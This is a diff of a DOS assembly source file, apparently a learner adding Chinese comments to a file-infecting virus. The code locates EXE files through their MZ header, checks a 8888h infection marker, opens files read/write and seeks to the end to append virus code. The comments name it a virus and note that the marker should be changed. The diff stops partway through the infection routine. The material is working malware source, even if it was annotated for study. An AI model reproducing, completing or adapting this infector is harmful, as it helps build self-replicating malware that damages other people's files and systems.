@@ -7,7 +7,7 @@ code segment
               mov  ax,cs                       ;初始化
               mov  ds,ax
 
-              call virus
+              call virus                       ;调用virus模块
     
               cmp  bp,0
               jnz  source
@@ -38,43 +38,51 @@ virus proc
               lea  dx,[bp+offset string]       ;输出字符串
               mov  ah,09h
               int  21h
-    ;DS:DX=磁盘缓冲区首址
+                                                ;DS:DX=磁盘缓冲区首址
               lea  dx,[bp+offset dta]          ;设置缓冲区dta
               mov  ah,1ah                      ;设置磁盘缓冲区DTA，，DS:DX=磁盘缓冲区首址
               int  21h
 
               lea  dx,[bp+offset filename]     ;查找第一个文件
-              mov  cx,0                        ;cx:属性
-              mov  ah,4eh                      ;4e号功能,查找第一个匹配项
+              mov  cx,0                        ;cx:属性，
+                                               ;值所匹配的文件类型
+                                               ;00h 普通文件
+                                                
+              mov  ah,4eh                       ;*是任意匹配
+                                                ;参数：DS:DX=带路径的文件名，CX=属性
+                                                ;4e号功能,查找第一个匹配项
+                                                ;dos中断4EH成功后，数据会写入到DTA（data transfer area）
               int  21h
               jc   Exit                        ;失败时CF=1，说明无匹配项直接结束
 
     modify:   
               lea  dx,[bp+offset dta]          ;匹配结果再磁盘缓冲区中
-              add  dx,1eh                      ;文件名地址
-    ;DS:DX=带路径的文件名
+              add  dx,1eh                      ;DX是文件名
+                                                ;DS:DX=带路径的文件名
               mov  ax,3d02h                    ;3d打开文件,02方式：读写
               int  21h                         ;CF=0成功,AX=文件号,CF=1失败,AX=错误码
 
-              mov  bx,ax                       ;文件号
+              mov  bx,ax                       ;保存文件句柄到BX中
     
               mov  ax,4200h                    ;移动文件指针到文件头
-    ;BX=文件号,CX:DX=移动的位移量
+                                                ;BX=文件号,CX:DX=移动的位移量
               xor  cx,cx
               xor  dx,dx
               int  21h
 
               mov  ah,3fh                      ;3F号功能,读文件头,内容存到head
-    ;BX=文件号，CX=字节数
+                                                ;BX=文件号，CX=字节数
+                                                ;DS:DX=数据缓冲区地址
+
               mov  cx,30h                      ;读取30字节
 
-              lea  dx,[bp+offset head]         ;??????????????????????????????????????????????????????
+              lea  dx,[bp+offset head]         ;设置head
               mov  si,dx                       ;si=offset head
               int  21h
 
               cmp  word ptr [si],5a4dh         ;检查是否是exe,5a4d为文件的标识
               jnz  next_file
-
+;!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!病毒标识，需要更改
               cmp  word ptr [si+2ah],8888h     ;检查是否已被感染
               je   next_file
 
@@ -86,10 +94,10 @@ virus proc
               xor  cx,cx                       ;位移量清零
               xor  dx,dx
               mov  ax,4202h                    ;42号功能，AL=方式0-正向1-相对2-反向
-    ;移动指针到文件尾，病毒代码插入到尾部
-    ;返回：CF=0成功,DX:AX=新的文件指针
+                                                ;移动指针到文件尾，病毒代码插入到尾部
+                                                ;返回：CF=0成功,DX:AX=新的文件指针
               int  21h
-    ;--------------------------------------------------
+    ;--------------------------------------------------以下未看
               push ax
               sub  ax,200h
               mov  cx,ax
